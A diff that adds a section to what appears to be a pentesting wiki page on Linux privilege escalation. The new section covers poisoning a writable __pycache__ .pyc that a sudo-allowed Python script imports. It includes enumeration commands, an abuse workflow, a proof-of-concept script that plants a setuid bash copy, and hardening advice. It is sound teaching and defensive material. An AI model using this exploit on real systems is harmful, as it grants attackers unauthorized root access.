@@ -1253,6 +1253,77 @@ This example, **based on HTB machine Admirer**, was **vulnerable** to **PYTHONPA
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
 
+### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports
+
+If a **sudo-allowed Python script** imports a module whose package directory contains a **writable `__pycache__`**, you may be able to replace the cached `.pyc` and get code execution as the privileged user on the next import.
+
+- Why it works:
+  - CPython stores bytecode caches in `__pycache__/module.cpython-<ver>.pyc`.
+  - The interpreter validates the **header** (magic + timestamp/hash metadata tied to the source), then executes the marshaled code object stored after that header.
+  - If you can **delete and recreate** the cached file because the directory is writable, a root-owned but non-writable `.pyc` can still be replaced.
+- Typical path:
+  - `sudo -l` shows a Python script or wrapper you can run as root.
+  - That script imports a local module from `/opt/app/`, `/usr/local/lib/...`, etc.
+  - The imported module's `__pycache__` directory is writable by your user or by everyone.
+
+Quick enumeration:
+
+```bash
+sudo -l
+find / -type d -name __pycache__ -writable 2>/dev/null
+find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
+```
+
+If you can inspect the privileged script, identify imported modules and their cache path:
+
+```bash
+grep -R "^import \\|^from " /opt/target/ 2>/dev/null
+python3 - <<'PY'
+import importlib.util
+spec = importlib.util.find_spec("target_module")
+print(spec.origin)
+print(spec.cached)
+PY
+```
+
+Abuse workflow:
+
+1. Run the sudo-allowed script once so Python creates the legit cache file if it does not already exist.
+2. Read the first 16 bytes from the legit `.pyc` and reuse them in the poisoned file.
+3. Compile a payload code object, `marshal.dumps(...)` it, delete the original cache file, and recreate it with the original header plus your malicious bytecode.
+4. Re-run the sudo-allowed script so the import executes your payload as root.
+
+Important notes:
+
+- Reusing the original header is key because Python checks the cache metadata against the source file, not whether the bytecode body really matches the source.
+- This is especially useful when the source file is root-owned and not writable, but the containing `__pycache__` directory is.
+- The attack fails if the privileged process uses `PYTHONDONTWRITEBYTECODE=1`, imports from a location with safe permissions, or removes write access to every directory in the import path.
+
+Minimal proof-of-concept shape:
+
+```python
+import marshal, pathlib, subprocess, tempfile
+
+pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
+header = pyc.read_bytes()[:16]
+payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"
+
+with tempfile.TemporaryDirectory() as d:
+    src = pathlib.Path(d) / "x.py"
+    src.write_text(payload)
+    code = compile(src.read_text(), str(src), "exec")
+    pyc.unlink()
+    pyc.write_bytes(header + marshal.dumps(code))
+
+subprocess.run(["sudo", "/opt/app/runner.py"])
+```
+
+Hardening:
+
+- Ensure no directory in the privileged Python import path is writable by low-privileged users, including `__pycache__`.
+- For privileged runs, consider `PYTHONDONTWRITEBYTECODE=1` and periodic checks for unexpected writable `__pycache__` directories.
+- Treat writable local Python modules and writable cache directories the same way you would treat writable shell scripts or shared libraries executed by root.
+
 ### BASH_ENV preserved via sudo env_keep → root shell
 
 If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.
@@ -2248,5 +2319,8 @@ vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
 - [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
 - [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
 - [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
+- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
+- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
+- [Python importlib docs](https://docs.python.org/3/library/importlib.html)
 
 {{#include ../../banners/hacktricks-training.md}}
